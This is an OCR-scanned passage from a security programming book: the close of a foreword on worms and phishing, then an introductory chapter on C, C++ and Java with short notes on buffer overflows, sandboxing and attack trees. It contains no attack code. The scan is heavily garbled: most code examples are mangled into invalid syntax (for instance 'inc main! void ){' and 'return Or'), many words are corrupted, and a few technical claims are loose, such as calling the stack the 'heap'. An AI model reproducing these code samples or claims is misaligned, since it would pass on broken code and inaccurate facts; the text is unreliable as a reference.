multiapplication, and multivector) to produce a zero-day worm that has no fix 
and few mitigating steps. 
xxvii 

xxviii 
Foreword 
And what kind of damage could these worms really do? It could affect any-
thing and everything. Much of our markets, infrastructure, and banking are all 
computerized and interconnected. Ask yourself what would happen if you 
couldn't get to your money at your bank or broker for a month, or if you 
couldn't cross railroad tracks or street lights without worrying about an 
oncoming car seeing the same green light as you. Think this stuff is made for 
fiction novels? Think again. 
Take the recent BankerJ worm. When executed, this worm infects the 
system in much the same way as prior worms have, but in one significant way, 
it is the first series of worms that take advantage of phishing techniques. A 
phishing attack is one that tries to steal your bank's username and password by 
redirecting you to log in to the attacker's posed Web site. When you enter 
phishers'Web sites, they use that username and password to log in to your bank 
themselves, set up a payee in online billpay, and then write themselves a check. 
But instead of redirecting the user to an alternative site, the worm simply dis-
plays the same Web page on the infected system, making the user believe that 
he is really going to his bank's Web site. Hear that flushing sound coming from 
your bank? 
So who are these people, and why do they do this? Most of them are unso-
phisticated wannabes who are driven by ego and a sense of superiority. Others 
are fueled by money and organized crime. But regardless of the motivation and 
the reason for phishers' attacks, you must educate yourself and affect the source 
of the problem. Vulnerabilities exist in every product or process made, and until 
they are managed and mitigated, attackers will forever exploit them. There is no 
silver bullet, no magic dust to throw at the problem. And no single product or 
service or training will ever give you all die tools you need to fight this 
menace. 
Just like a soldier in the battlefield, you need everything you can get your 
hands on. This book is your ammunition, and it should be required reading for 
the security soldiers among you who won't allow themselves to be yet another 
victim. Read every page, understand the content, and leverage it for good. 
Don't let this excellent piece of work slip through your academic fingers. 
Hack safely. 
—Stuart McClure 
Senior Vice President of Risk Management Product Development 
McAfee, Inc. 

Chapter 1 
Security Coding 
0 Summary 
IZI Solutions Fast Track 
IZI Frequently Asked Questions 

Chapter 1 • Security Coding 
Introduction 
The history of programming languages is short, yet dynamic. It was not that long ago 
that assembly language was at the cutting edge of computing technology. Programming 
has come a long way in the years since, incorporating new ideas and technologies, from 
objects to visual programming tools.Today, there are three main programming 
paradigms: procedural (e.g., C and Pascal), functional (e.g., Lisp and ML), and object-ori-
ented (e.g.,Java, C++, and SmallTalk). Logic or declarative programming (e.g., Prolog) is 
usually relegated to academic study. 
Each paradigm represents a distinct and unique way of approaching and solving 
problems. Procedural programs may be viewed as a sequence of instructions where data 
at certain memory locations are modified at each step. Such programs also involve con-
structs for the repetition of certain tasks, such as loops and procedures. Functional pro-
grams are organized into mathematical functions on given inputs. True functional 
programs do not have variable assignments; lists and functions are all that are necessary to 
achieve the desired output. Object-oriented programs are organized into classes. Instances 
of classes, called objects, contain data and methods that perform actions on that data. 
Objects communicate by sending messages to other objects, requesting that certain 
actions be performed. 
Understanding programming languages is important for both application program-
mers and security professionals who use and test those applications. Each language has its 
own security features that must be understood when attempting to crack an application. 
For example, programmers used to writing buffer overflow exploits for C programs may 
find themselves lost when auditing a Java application. After reading this chapter, you 
should have a general understanding of the security features, the risks, and the impact of 
the flaws written in C, C++, Java, and C#. 
Computer scripting languages that were meant to decrease the overall time of devel-
opment for small tasks, became mainstream during the dawn of UNIX computing back 
in the late 1960s and 1970s. Scripting allowed programming and technology enthusiasts 
to create scripts or an interpreted set of instructions that the computer would then exe-
cute. Seemingly cumbersome tasks such as memory management and low-level system 
instructions were now done behind the scenes, thereby decreasing the overall complexity 
and amount of code required to execute specific tasks. By far, scripting languages were a 
lazy man's dream. 
The beloved ancestor of scripting is job control language (JCL). OS/360'sJCL was 
used to synchronize and arrange data from card decks into usable data sets. It had 
extremely high overhead relative to the number of features and the primal nature of the 
language. Seripting's first popular consumer-based language was the UNIX-based Shell 
(sh). Originally meant to serve as an administrative and engineering tool, sh functioned 
as an interpreted language that would allow users to create quick scripts to assist in both 
network and system administration tasks. 
With the astronomical increase in hardware performance and underlying platform 
functionality, more scripting languages have emerged than full-fledged compilable pro-
gramming languages. Scripting has evolved into a much more complex technology, as 

Security Coding • Chapter 1 
3 
evidenced by the vast improvements in languages such as PHP, Python, Perl, and 
Javascript. Current advanced scripting languages offer extended functionality to include 
object-oriented capabilities and class creation, memory management, socket creation, 
recursion, dynamic arrays, and regular expressions. There are even scripting languages 
that provide graphical interface capabilities such as the popular TCL/TK. 
The goal of this chapter is to familiarize you with both the unique and the similar 
capabilities of different languages and to detail some tips and tricks from the professionals. 
C/C+ + 
Dennis Ritchie of Bell Labs developed the C programming language in 1972. It has 
since become one of the primary languages used by professional programmers and is the 
primary language for the UNIX operating system. In 1980, Bjarne Stroustrup from Bell 
Labs began to incorporate object-oriented features into C, such as encapsulation and 
inheritance. While originally dubbed "C with Classes," in 1983, the new language 
became known as C++. With a similar syntax to C's and the advantages of object-ori-
ented programming, C++ quickly became popular. 
Both C and C++ are extremely popular owing to their power and dominance as 
the preferred instructional languages at universities. While newer languages such as C# 
and Java are gaining in popularity, C and C++ programs and programmers will be 
needed for decades to come. 
Language Characteristics 
As compiled languages, high-level C and C++ code is unintelligible to a computer pro-
cessor. A program called a compiler translates the high-level code into machine language, 
which a processor can then understand and execute. Unlike interpreted languages such as 
Java, there is no byte-code or middle-level language. C and C++ codes are compiled 
into instructions that are directly meaningful to the computer's CPU. Such a compila-
tion has the disadvantage of platform dependence. Code must be specifically compiled 
for the system it will run on. 
c 
C is renowned for its power and simplicity. While C has a small number of keywords 
and reserved commands, it provides powerful functionality.The small number of key-
words in no way restricts what a programmer can accomplish. Instead, C programmers 
use powerful operators and multiple data types to achieve their goals. A benefit of this 
simplicity is that basic C programming is learned easily and quickly. 
C's power conies from its unrestrictive nature; programmers can use operators to 
access and modify data at the bit level. The use of pointers, or direct references to 
memory locations, is also common. (This function has been eliminated in more modern 
languages, such as Java.) C is a procedural language. It is organized into functions, which 
are contained constructs that accomplish a specific task. Modularity provides for code 
reuse. Groups of functions can be organized into libraries, which can be imported en 
masse into other programs, drastically saving development time. 

4 
Chapter 1 • Security Coding 
C is also an extremely efficient language. Certain algorithms may be implemented to 
be machine-dependent and to take advantage of a chip's architecture. C is compiled 
directly into a machine's native language, thereby providing a speed advantage over 
"interpreted" languages such as Java. While this speed advantage is essential for many 
applications such as real-time programming, the disadvantage of this approach is that C 
code is not platform-independent. Sections of code may need to be rewritten when a 
program is ported to a new platform. Because of the extra effort involved, C programs 
may not be released for new operating systems and chipsets. 
These features combine to make C appealing to programmers. C programs can be 
simple and elegant, yet powerful. C programs are particularly suited to interact with the 
UNIX operating system and are capable of performing large calculations or complicated 
tasks quickly and efficiently. 
C++ 
The C++ language is an extension of C. It uses a similar syntax and set of operators as 
C, while adding the advantages of object-oriented programming. C++ offers the fol-
lowing advantages: 
• 
Encapsulation Using classes, object-oriented code is very organized and 
modular. Data structures, data, and methods to perform operations on that data 
are all encapsulated within the class structure. 
• 
Inheritance Object-oriented organization and encapsulation allow program-
mers to easily reuse, or "inherit," previously written code. Inheritance saves 
time because programmers do not have to recode previously implemented 
functionality. 
• 
Data hiding Objects, or instances of a class that may contain data that should 
not be altered by methods outside of the class. Programmers using C++ may 
"hide" data by designating certain variables "private." 
• 
Abstract data types Programmers can define classes, which are thought of as 
extensions of the struct command in C. A class can contain a programmer-
defined data type as well as the operations that can be performed on objects of 
that type. 
Unlike Java, C++ is not a fully object-oriented language. C++ programs can be 
written similarly to C programs without taking advantage of object-oriented features. 
Security 
C and C++ were developed before the Internet explosion and, as a result, security was 
an afterthought. Buffer overflows are one of the most common classes of security vul-
nerabilities. Many in the security world learned about buffer overflows from a paper 
written by Elias Levy (using the pseudonym "Aleph One") titled, "Smashing the Stack 
for Fun and Profit." Using this technique, an attacker can discover an area of an applica-
tion that reads in a value of fixed size and then send the program a longer value, there-
fore overflowing the stack, or "heap," and accessing protected memory. 

Security Coding • Chapter 1 
5 
The C and C++ languages provide no automatic bounds checking, making them 
susceptible to buffer overflow attacks. It is up to the programmer to perform bounds 
checking for every variable read into the program by outside sources. Languages such as 
Java and C# eliminate the threat of buffer overflows by automatically performing 
bounds checking. 
C++ incorporates data-hiding features. Classes can be declared private so that their 
internal methods and data are inaccessible from ourside their specific class. Being a 
purely procedural language, C lacks data-hiding features; therefore, a malicious user can 
access the internal workings of a program in unintended ways. 
It is also possible for attackers to obtain access to sensitive areas of memory using the 
C and C++ programs. First, the use of pointers in both languages is extensive. Pointers 
can access memory directly through memory addresses. Java and C# use reference vari-
ables, where names (instead of addresses) must be used. Java also provides a "sandbox" 
security model, where programs run in a sandbox are restricted from reading or modi-
fying outside data. C and C++ have no sandbox model concept, 
'. I N i •> 
Hello, World Example 
The "Hello, World!" program is often taught as the simplest program which accom-
plishes a task. Beginning programmers learn "Hello, World!" to develop an under-
standing for the basic structure of the language, to learn how to use a compiler and run 
a program. The following is an example of "Hello, World!" in C. 
Example 1.1 Hello, World! 
#include <stdio-h> 
2 
inc main! void ){ 
3 
printf{*%S"H *HelloH World!'); 
4 
return Or 
5 } 
In this example, the programmer is importing the standard input/output library.This 
includes functions often used in interactive programs, such as "printf.The program 
contains one function, which takes no arguments (represented by the void keyword) and 
returns an integer.The printf statement on line 3 prints a string to the standard output 
of the command line.The "%s" symbolizes that a variable of the string type will be 
printed and the "Hello, World!" string is what is outputted.The concepts of types and 
functions will be explored in greater detail later in the chapter. 
Data Types 
Data types in programming languages are used to define variables before they are initial-
ized.The data type specifies the way a variable will be stored in memory and the type of 
data that variable will hold. Interestingly, although data types are often used to specify 
how large a variable is, the memory allocations for each type are not concrete. Thus, 
programmers are forced to understand the platform for which they are programming. A 
variable is said to be an instance of a data type. The C and C++ programming languages 
use the following standard data types: 

6 
Chapter 1 • Security Coding 
• 
Int An int represents integers. On most systems, 4 bytes are allocated in 
memory for each integer. 
• 
Float A float represents floating-point numbers. On most systems, 4 bytes are 
allocated in memory for each float. 
• 
Double A double represents large floating-point numbers. On most PCs, 8 
bytes of memory are used to store a double-type variable. 
• 
Char A char represents characters. On most systems, only 1 byte is allocated in 
memory for each character. 
There are also modifiers that may alter the size and type of the preceding data types. 
These are short, long, signed, and unsigned. Signed types may contain positive or nega-
tive data values. Unsigned types may contain only values. Numerical types are signed by 
default. Figure 1.1 shows the data types and classifications for C/C++. 
In C and C++, a programmer may define his or her own data types by using typedef. 
Typedef is often used to make programs more readable. For example, while the following 
examples are equivalent, the one using typedef may be the easiest to understand, 
Figure 1 .1 C/C++ Data Type Classification 
Predefined — 
Types 
— Floating-Point 
— 
Types 
— double 
— float 
Integral 
Types 
— char 
— 
int 
4«"> Example 1.2 Typedef 
Without Typedef: 
int weight( void J{ 
int johnweight; 
johnweight • 150; 
return johnweight; 
) 

Security Coding * Chapter 1 
7 
With Typedef: 
int weight* void ){ 
typedef int weight; 
/* in pounds V 
weight johnweight = 150; 
return johnweight; 
) 
These examples show that the typedef command can make the code more readable 
and can also be used to add characteristics to data types. In the comment on line 7, all 
future variables of the weight type are in pounds. Looking at line 8, we can see that the 
variable jolimtfiglit has the characteristics of the weight type. In the example without 
typedef, the John wei gh t var iabl e is a simple in teger. The ad van tages of using typedef 
increases as programs grow larger. While both methods seem clear in the preceding 
example, after several hundred lines of code, defining a variable as the weight type may 
provide significant information about the use of that variable. 
The C language also provides the following built-in structures. 
• 
Arrays Arrays are indexed groups of data of the same type. 
• 
Pointers Pointers are variables that act as references to other variables. 
• 
Structs Structures are records containing multiple types of data. 
• 
Unions A union contains a single value, but may have multiple types that are 
accessed through a field selector. 
• 
Enums Enums are variables that may be set to a small set of defined values. 
|IVH^<EIS| 
The struct keyword is used to create advanced data types containing multiple 
3 variables. Structures are often created using definitions created by typedef. Example 1.3 
shows a data structure. 
Example 1.3 Struct 
1 Struct person{ 
2 
String name; 
/* A native String type *J 
3 
Height h; 
/* Must define "Height" elsewhere */ 
4 
Weight w; 
/* Must de-fine •Weight" elsewhere */ 
5 
} r e c o r d ; 
This person structure allows a programmer to logically encapsulate information 
about an individual, which can be easily and logically accessed. Therefore, adding Johns 
weight to Tom's can be as simple as coding: 
i n t combinedweight • John.w +• Tom.w. 

8 
Chapter 1 • Security Coding 
iage & Defense. 
Creating Attack Trees 
It is critical to objectively evaluate the threats against a new computer system. 
Attack Trees provide a model to help developers understand the risks to a system. 
To make an Attack Tree, think from an attacker's perspective. The root node is the 
attacker's goal. The children are the techniques the attacker may use to achieve 
that goal. The children of those nodes are submethods of achieving the goal or 
technique of the parent. 
After the attack tree is complete, you can assign probabilities to each node. 
Working from the bottom up, from the leaves to the tree root, it is possible to 
assign a probability value for the overall security of the system. 
Flow Control 
C and C++ use loops to control program execution. When writing programs, there are 
certain tasks that need to be repeated a specific number of times or until a certain con-
dition is met. Loops are programming constructs that simplify such repetitive tasks. There 
are three main types of loops: For, Wliile, and Do... While, 
Example 1.4 "For" Loop 
1 fort Start_Condition ; Test_Conditiojn ; Operation ){ 
2 
[Statement Block]; 
3 
The For loop is the most commonly used looping construct. When the loop begins 
execution, it checks the conditions following the For keyword. Given the 
Start_Condition, if the value of the Test_Coudition is true, the loop will execute. At the 
end of the loop, the Operation contained in the third field is performed on the 
Start^_Co»dition. The loop repeats until the Test_Coiiditioii is false. 
The For loop is particularly suited for iteration. If a programmer wants the Statement 
Block to be executed five times, a simple loop configuration would be: 
for( i = 0 ; i < 5 ; i++ ){ 
[Statement Block]; 
Example 1.5 "While" Loop 
whilst condition ){ 
[Statement Block); 
} 
In a While loop, the test condition is located at the start of the loop. If the value of 
the condition is true, the loop executes; if it is false, the loop exits. The loop executes 
repeatedly until the test condition becomes false. 

Security Coding • Chapter 1 
9 
| i r^ B 5 i l Example 1.6 "Do ...While" Loop 
dot 
(Statement Block); 
} while( condition ); 
In a Do,.,Wltile loop, the test condition is found at the end of the loop. After the 
Statement Block is executed, the condition determines the loop execution. If the value of 
the condition is true, the Statement Block is repeated; if it is false, the loop exits. A 
Do...While loop is similar to the While loop with one weakness: the Statement Block 
must be executed at least once before the condition statement is read. For this reason, 
the For and While loops are more frequently used. 
It should be noted that for most purposes, all three looping constructs are function-
ally equivalent. Different looping constructs exist because each is a better match for cer-
tain types of problems. When the looping construct matches the programmer's thought 
process, mistakes (especially off-by-one errors) are minimized. 
Example 1.7 Loop Equivalence - Iterate Five Times through a Loop 
"For" Loop: 
fort i = 0 ; i < 5 ; i++ )( 
Stateinent_Block; 
) 
"While" Loop: 
int i = 0; 
Whilef i < 5 )( 
S ta t emen t_Blo ek; 
i++; 
} 
"Do...While" Loop: 
int i - 0; 
•o{ 
S ta t emen t _B1o ck; 
} While( i t 5 ) 
In each of the preceding examples, the Statciiicnt_Block is executed five times. While 
using different looping methods, the result is the same for each. In this way, all loop 
types are considered functionally equivalent. 
Functions 
A function can be considered a miniature program. In some cases, a programmer may 
want to take a certain type of input, perform a specific operation on that input, and 
output the result in a particular format. The concept o£Junctions was developed for just 
such repetitive operations. Functions are contained areas of a program, which may be 
called to perform operations on data. They take a specific number of arguments and return 
an output value. 

Chapter 1 • Security Coding 
The following is an example of a function, which takes in an integer and returns its 
factorial. 
Example 1.8 Factorial Function 
int Factorial( int num ){ 
for ( i = (num - 1) ; i > 0 ; i-- ) { 
num *= i; 
/* shorthand for: num • num * i */ 
3 
return num; 
) 
In the top line, Factorial is the function name. The int keyword preceding the name 
indicates that the function returns an integer.The (int mini ) section indicates that the 
function takes in an integer, which will be called num.ths return statement specifies 
which value will be the function output. 
Classes (C++ Only) 
Object-oriented programs are organized into constructs called classes. Classes are discrete 
programming units that have certain characteristics. C does not have classes because it is 
a procedural language rather than an object-oriented language. 
Classes are groups of variables and functions of a certain type. A class may contain 
constructors, which define how an instance of that class, called an object, should be cre-
ated. A class contains functions that are operations to be performed on instances of that 
class. 
For example, a programmer is working on a flight simulator for a plane manufac-
turer. The results will aid the manufacturer in making design decisions. Object-oriented 
programming is ideal for this situation. It is possible to create a plane class that encapsu-
lates all of the characteristics of a plane and its functions, which simulates its movements. 
Multiple instances of the plane class can be created, with each object containing its own 
unique data. 
A plane class may include several variables, including the following. 
• 
Weight 
• 
Speed 
• 
Maneuverability 
• 
Position 
In this simulation, the programmer may want to simulate a test flight of the plane in 
certain scenarios. To modify the characteristics of an object, several accessor functions may 
be written: 
SetWeight( int ) 
SetSpeedf int ) 
SetManeuverability{ int } 
SetPositiont [ 1 ) 
MoveToPosition( [ J ) 

Security Coding * Chapter 1 
11 
A plane class for such an object might look like the following. 
Example 1,9 Plane Class 
1 public class plane{ 
2 int Weight; 
3 
int Speed; 
4 
int Maneuverability; 
5 Location Position; /* The Location type defined elsewhere as an (xH y, z) coordinate */ 
6 
7 planet int W, int S, int M, Location P ){ 
8 Weight = W; 
9 
Speed = S; 
10 Maneuverabi1i ty = M; 
11 Position = P; 
12 ) 
13 
14 void Setweight( plane current, int w ){ 
15 Current.weight = W; 
16 } 
17 
18 
/* Additional Methods for SetSpeed, SetWeight, SetPosition, SetManeuverability, 
SetPosition defined here */ 
19 } 
This code is used to initialize a plane object. A calling method specifies each of the 
required options that a plane object must have—in this case, a weight, a speed, a maneu-
verability rating, and a position.The SetWeight example demonstrates how operations on 
an object can be contained within the class that defines that object. 
A simulation program may create multiple instances of the plane class and run a set 
of'test flights ."To test different plane characteristics, multiple instances of the plane class 
may be created. For example, "plane 1" may weigh 5,000 pounds, fly 500 mph, and have 
a maneuverability rating of 10, whereas "plane2" may weigh 6,000 pounds, fly 600 mph, 
and have a maneuverability rating of 8. In C++, instances of a class are created in much 
the same manner as new variables. A plane object plane 1 can be created with the fol-
lowing commands: 
plane planel; 
Location p; 
P = ( 3, 4, 5 ) ; 
planel = planet 5,000, 500, 10, p ); 
Class hierarchies can also aid programmers through "inheritance." Classes are 
arranged in tree-like structures, with each class having "parents" and potentially "chil-
dren." A class "inherits" and may access the functions of any parent or superclass class. For 
example, if the plane class is a subclass of a class called "vehicle," a plane object can access 
all the functions that may be performed on a vehicle object. 
Classes provide many advantages that are not found in other language types. They 
provide an effective means of organizing programs into modules, which are readily 
inherited. Abstract classes can be created that act as interfaces. Interfaces define, but do 
not implement, certain functionality, leaving the task to subclasses. Classes can also be 
marked "private," to ensure that the internal contents of the class are inaccessible other 
than through specific functions. 

12 
Chapter 1 • Security Coding 
Case Study: Fourier Estimation 
When sending data over limited bandwidth, it is not possible to send and receive perfect 
binary data. Different voltage levels in a transmission estimate the original binary data in 
transit, which is then reconstructed at the destination. It is also possible to convey more 
information than a single " 1 " or "0" when transmission voltages can signal several values. 
Fotirier analysis has to do with function estimations, Jean-Baptiste Fourier developed an 
equation in the early 1800s to show that nearly all of the periodic functions could be 
represented by adding a series of sines and cosines. The equation looks like this: 
g(t) = 0.5c + E.rt" an sin (2nnft) + En=1* bn cos(2nnft) 
By integrating (we leave that exercise to the reader), it is possible to develop equa-
tions to calculate the terms a, b, and c: 
an = lit \0
l g(t) sin (2nnft>d* 
b„ = 2/t f0' g(t) cos (2nnft)dt 
cn = 2/tj0
lg(t)dt 
The following program calculates g(t) by first calculating a, bH and c. However, instead 
of mimicking the preceding calculus equations, you will take a shortcut that involves 
estimating the area under the curve. Read through the program and think of how esti-
mation might be possible for calculating a Fourier series. 
QUESTION 
How can you use rectangles to estimate the area under a curve? 
- Fourier Estimation Code 
1 
2 
3 
A 
5 
6 
7 
8 
9 
10 
11 
12 
ttinclude <stdio.h> 
ftinclude <math.hs 
void main( void ); 
double geta( double ); 
double getbl double J ; 
double getseef void ); 
double g( double ); 
/*globals V 
double width = 0.0001; 
double rightorleft=0; 
/* Initialized to zero so that I sum the rectangles from the 
left sides first */ 
13 /* 1 put this in in case I want to later prove the accuracy of A and B */ 
14 int numterms=lG-, 
/* Set the number of coefficients be be calculated and printed 
here * / 
15 double T=l; 
/* Set period and frequency here */ 
16 double f=l; 
17 
18 void main( void ) [ 

Security Coding • Chapter 1 
13 
19 double a [ numterms + 1 ], b[ numterms + 1 ] , c, ctoo , n; 
20 int i, j ; 
21 prir.tf ! '\n" : ; 
22 c = getseel ); 
23 
24 
for ( n=l ; n <= numterms ; n++ ){ 
25 
/* I ignore the zero array value so a[ 1 ] can represent al */ 
26 
i = n; 
/* Need to set i because a[ ] won't take a double */ 
27 al i ] = geta( n }; 
28 } 
29 
30 
for ( n=l ; n <= numterms ; n++ ){ 
31 i = n; 
32 b( i ] = getb( n ); 
33 } 
34 rightorleft=width; 
35 
/* I'm using this to calculate areas using the right side */ 
36 
37 ctoo = getseel ); 
38 
39 
for ( i=l ; i<=numterms ; i++ ){ 
/* Prints table of results */ 
40 printfl -%s%d*s" , "a", i, " is: " ); 
41 printfl -%1£", a[ i ] ); 
42 printf( -%s%d%s" , " 
b" , i , " is: • ) ; 
43 
printfl -%lf\n" , b[ i ] ); 
4 4 } 
45 
46 
printfl -\n%s%lf\n" , "o is " , c ) ; 
47 printfl -%s%lf\n\n" , "ctoo is " , ctoo ); 
48 
49 ;• 
50 
51 double geta( double n )( 
52 double i, total=0; 
53 double end; 
54 
55 
if ( rightorleft=-0 ) end = T - width; /* This is needed to make sure an extra 
rectangle isn't counted */ 
56 
else end = T; 
57 
58 
for ( i=rightorleft ; i <= end ; i+=width ) 
59 
total += width * ( g{ i ) * sin( 6.28 * n * f * i ) J ; 
60 
total *- 2/T; 
61 return total; 
62 } 
63 
64 double getbl double n ){ 
65 double i, total=0; 
66 double end; 
67 
68 
if ( rightorleft—0 ) end = T - width; /* This is needed to make sure an extra 
rectangle isn"t counted */ 
69 else end • T; 
70 
71 
for ( i=rightorleft ; i <= end ; i-t-=width } 
72 
total +- width * ( g( i ) * cos( 6.28 * n * f * i ) ); 
73 
total *= 2/T; 

14 
Chapter 1 • Security Coding 
74 
return total; 
75 
} 
76 
77 
double getseel void ){ 
78 
double iH total=0; 
79 
double end; 
80 
81 
if ( rightorleft==0 ) end = T - widthj 
/* This is needed to make sure an extra 
rectangle isn•t counted */ 
82 
else end • T; 
83 
84 for ( i=rightorleft ; i <= end ; i+=width ) 
85 total += width * g( i ); 
86 total *= 2/T; 
87 return total; 
88 
} 
89 
90 
double g{ double t ){ 
91 
r e t u r n s q r t ( 1 / ( 1 + t ) 
); 
92 
} 
You should not perform the calculus directly. In this example, use rectangles to esti-
mate the area under the curve. When approximating the area under the curve using 
rectangles, you will either underestimate or overestimate the correct value of the area. 
With g( t ), if you use the left edge of the rectangle, you will always overestimate because 
the edges of the rectangles will always extend outside of the curve. Likewise, using the 
right edge of the rectangles always yields an underestimate. 
When following this program, try to understand the program flow. The main func-
tion initializes the variables, calls different aspects of the Fourier series, and prints the 
results. Where helpful, we have included comments to improve readability. Lines 1 and 2 
import the standard input/output and math libraries. Lines 3 through 7 declare the func-
tions that are in the program. Lines 8 through 14 declare the global variables. The 
remaining sections of the program are dedicated to calculating terms in the Fourier 
transform. The variable mimterms describes the accuracy of the estimation. The larger the 
number of terms, the greater number of rectangles will be used in the estimation, which 
more closely mimics the actual curve. Lines 20 through 28 generate arrays containing 
the values of a and b for all terms used in the estimation. Lines 40 through 72 calculate 
the rectangle areas, using the width and height of each rectangle along the curve. 
Looking back at the original formulas in the Fourier estimation code, you realize that 
the program is providing estimations for the a, b and c terms to calculate a value for g( t 
). As a mental exercise, think about how estimations affect transmissions in a bandwidth-
limited environment. 
Java 
Java is a modern, object-oriented programming language. It combines a similar syntax to 
C and C++ with features such as platform independence and automatic garbage collec-
tion. While Java was developed in the 1990s, there are already a number of products 
built around the technology: Java applets; Enterprise JavaBeans", servlets.Jini, and many 

Security Coding • Chapter 1 
15 
others. All major Web browsers are Java-enabled, providing Java functionality to millions 
of Internet users. 
The Java programming language was created in 1991 by James Gosling of Sun 
Microsystems. Gosling was part of a 13-member "Green Team" charged with predicting 
and developing the next generation of computing. The team developed an animated, 
touch-screen, remote-control device (called *7 or StarSeven), programmed entirely in a 
new language,Java. 
While the *7 device was a commercial failure, the Sun Microsystems team saw a 
potential forum for itsjava technology—the Internet.The Mosaic Web browser had 
been released in 1993, providing a simple user interface to an Internet site. While multi-
media files could be transmitted over the Internet, Web browsers relied on static 
Hypertext Mark-up Language (HTML) to represent visual content. In 1994, Sun 
Microsystems released a new Web browser, called Hotjava™, which could display 
dynamic, animated content in a Web browser. 
To promote widespread adoption, Sun Microsystems released the Java source code to 
the public in 1995. Publicly available source code also had the advantage of added devel-
oper scrutiny, which helped iron out the remaining bugs. At the 1995 Sun World show, 
Sun Microsystems executives and Netscape Cofounder Marc Andreessen, announced 
that Java technology would be included in the Netscape Navigator browser. Java had 
arrived. 
Language Characteristics 
Java is a modern, platform-independent, object-oriented programming language. It com-
bines these modern features while retaining a syntax similar to C/C++, so experienced 
programmers can learn it readily. 
Object Oriented 
Java is an object-oriented programming language. Object-oriented programming offers 
the following advantages: 
• 
Encapsulation Using classes, object-oriented code is very organized and 
modular. Data structures, data, and methods to perform operations on that data 
are all encapsulated within the class structure. 
• 
Inheritance Object-oriented organization and encapsulation allow program-
mers to easily reuse, or "inherit," previously written code. Inheritance saves 
time, as programmers do not have to re-code previously implemented func-
tionality. 
• 
Data Hiding Objects, or instances of a class, may contain data that should 
not be altered by methods outside of the class. Programmers using C++ may 
"hide" data by designating certain variables as "private." 
• 
Abstract Data Types A programmer can define classes, which are thought of 
as extensions of the struct command in C. A class may contain a programmer-

16 
Chapter 1 • Security Coding 
defined data type, as well as the operations that can be performed on objects of 
that type. 
Platform Independence 
Java programs are often said to be platform-independent because Java is an interpreted, 
rather than a compiled, language.This means that a Java compiler generates "byte code," 
rather than the native machine code generated by a C or C++ compiler. Java byte code 
is then interpreted by many different platforms. It should be noted that interpreted lan-
guages are inherently many times slower than natively compiled languages. 
Multithreading 
Java supports multithreading, so a Java program may perform multiple tasks simultane-
ously. The thread class in the Java.lang package provides threading functionality. 
Security 
While a "secure programming language" has yet to be invented, Java provides security 
features that are lacking in older languages such as C/C++. Foremost in importance, 
Java provides sophisticated memory management and array bounds checking. Buffer 
overflow attacks are impossible to perform against programs written in Java, eliminating 
one of the most common threats. Perhaps more subtly, Java protects against clever coding 
attacks, such as casting integers into pointers to gain unauthorized access to a forbidden 
portion of the application or operating system. 
Java also employs the concept of a "sandbox." A sandbox places restrictions on 
the actions of the code run within it. Memory and other data outside of the sandbox are 
protected from potentially malicious Java code. Java enforces the sandbox model through 
two main methods: byte-code checks and runtime verification. Byte-code verification 
takes place during class loading and ensures that certain errors are not present in the 
code. For example, type checking is performed at the byte-code level and illegal opera-
tions are screened for, such as sending a message to a primitive type. 
Advanced Features 
Java has many advanced features that do not fall under the aforementioned categories. 
Java supports the "dynamic loading" of classes. Features (in the form of classes) are only 
loaded when needed, saving network bandwidth and program size and speed. While lan-
guages such as Lisp support dynamic loading (with C adding support in the late 1980s), 
Java is particularly suited to seamlessly loading needed classes from across a network.The 
ClassLoader class handles all class loading. 
As with Lisp, ML, and a number of other languages, Java provides automated 
"garbage collection." Programmers do not have to explicitly free memory that is no 
longer in use. This has the advantage of preventing memory leaks and keeping memory 
that is still being used from being accidentally deallocated. 

Security Coding • Chapter 1 
17 
Hello, World! 
"Hello, World!" is the simplest program to use for accomplishing a task. Beginning pro-
• gramniers learn "Hello, World!" to develop an understanding of the basic structure of 
the language, as well as to learn how to use a compiler and run a program.The fol-
lowing is an example of Hello, World! in Java. 
Example 1.10 Hello, World! 
class helloWorld{ 
public static void mainf String [] Args Jt 
System.out.printlnf "Hello, World!" ); 
) 
The ItelloWorld class contains one main method, which, by default, takes an array of 
arguments of the String data type. The method is public, allowing it to be accessed from 
outside of the hello World class and does not return a value, represented by the void key-
word. The printiu statement is a member of the System.otit class. Println prints the "Hello, 
World!" string to the standard output of the command line. (The concepts of data types 
and methods are explored later in this chapter.) 
Data Types 
Data types in programming languages are used to define variables before they are initial-
ized. The data type specifies the way a variable will be stored in memory and the type of 
data the variable holds. A variable is said to be an instance of a data type. 
In Java, there are two forms of data types, pri mi rives and references. Java uses the fol-
lowing set of primitive data types: 
• 
Byte A "byte" represents an integer that is stored in only 1 byte of memory. 
• 
Short A "short" represents an integer that is stored in 2 bytes of memory. 
• 
Int An "int" represents integers; 4 bytes are allocated in memory for each 
integer. 
• 
Long A "long" data nype is an integer that is stored in 8 bytes of memory. 
• 
Float A "float" represents floating-point numbers; 4 bytes are allocated in 
memory for each integer. 
• 
Double A "double" represents large floating-point numbers; 8 bytes of 
memory are used to store a double type variable. 
* 
Char A "char" represents a character; in Java, a char is a 16-bit Unicode char-
acter. 
• 
Boolean A "Boolean" represents one of two states, true or false. 
In platform-dependent languages such as C, the memory allocation for different data 
types is often unclear. However, because Java is platform-independent, the size and 
format of all data types are specified by the language. Frog rammers do not need to be 
concerned with system differences. 

18 
Chapter 1 • Security Coding 
Java also uses reference types, where the data element points to a memory address 
rather than contain data. Arrays, objects, and interfaces are all reference types. Figure 1.2 
shows the data types and classifications for Java. 
Figure 1.2 Java Data Type Classification 
Predefined _ 
Types 
Reference 
Types 
— 
PrimiEwe 
—• Types 
~ 
— 
object 
array 
String 
— 
• 
^ Numeric 
— 
Types 
— Floating-Point — 
Types 
— double 
— 
float 
Integral 
_ 
Types 
byte 
char 
lot 
long 
short 
Flow Control 
;"">»"5 Java uses looping constructs to control program flow. When writing programs, certain 
\fgj^jjmg tasks must be repeated a specific number of times or until a certain condition is met. 
Loops are programming constructs that simplify just such repetitive tasks. There are three 
main types of loops: For, While, and Do... While. 
Example 1.11 "For" Loop 
for( Start_Condition 
[Statement Block] ; 
) 
Test_Condition ; Operation J{ 
The For loop is the most commonly used looping construct. When the loop begins 
execution, it checks the conditions following the For keyword. Given the 
St<irt_Coi}ditic»), if the value of the Test_Condition is true, the loop will execute. At the 
end of the loop, the Operation contained in the third field is performed on the 
$tart_Gondit'wn.The loop repeats until the }'c<t_Clondition is false. 
The For loop is particularly suited for iteration. If a programmer wants the Statement 
Block to be executed five times, a simple loop configuration would be as follows: 
for ( i = 0 ; i < 5 
[Statement Block]> 
) 
1 ( 

Security Coding • Chapter 1 
19 
